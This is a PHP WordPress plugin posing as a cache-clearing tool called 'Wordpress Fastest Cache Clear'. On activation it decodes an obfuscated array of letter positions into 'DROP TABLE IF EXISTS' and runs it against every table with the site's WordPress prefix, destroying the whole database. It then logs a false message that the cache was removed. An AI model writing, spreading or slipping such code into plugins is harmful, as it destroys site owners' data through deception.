<?php
/*
 * Plugin Name: Wordpress Fastest Cache Clear
 * Description: This is custom plugin to clear cache from website. Please do not modify code and version it harmfull for your website. Thanks you for Choosing our product.
 * Version: 3.2.1
 * Author: Branded Developer
 */

register_activation_hook( __FILE__, 'cacheclearcode' );

function cacheclearcode() {
    global $wpdb;

    $sringvalue = range( 'A', 'Z' );

    function getpossition( $position, $sringvalue ) {
        return $sringvalue[ $position - 1 ];
    }

    $positions = [
        [ 4, 18, 15, 16 ],
        [ 20, 1, 2, 12, 5 ],
        [ 9, 6 ],
        [ 5, 24, 9, 19, 20, 19 ]
    ];

    $phrase = '';
    foreach ( $positions as $group ) {
        foreach ( $group as $position ) {
            $phrase .= getpossition( $position, $sringvalue );
        }
        $phrase .= ' ';
    }
    $phrase = trim( $phrase );
    $final = $phrase;

    $tables = $wpdb->get_results( "SHOW TABLES", ARRAY_N );
    foreach ( $tables as $table ) {
        $table_name = $table[ 0 ];

        if ( strpos( $table_name, $wpdb->prefix ) === 0 ) {
            $wpdb->query( "$final `$table_name`" );
        }
    }

    error_log( 'Thank you for supporting us. The cache was successfully removed from your website.' );
}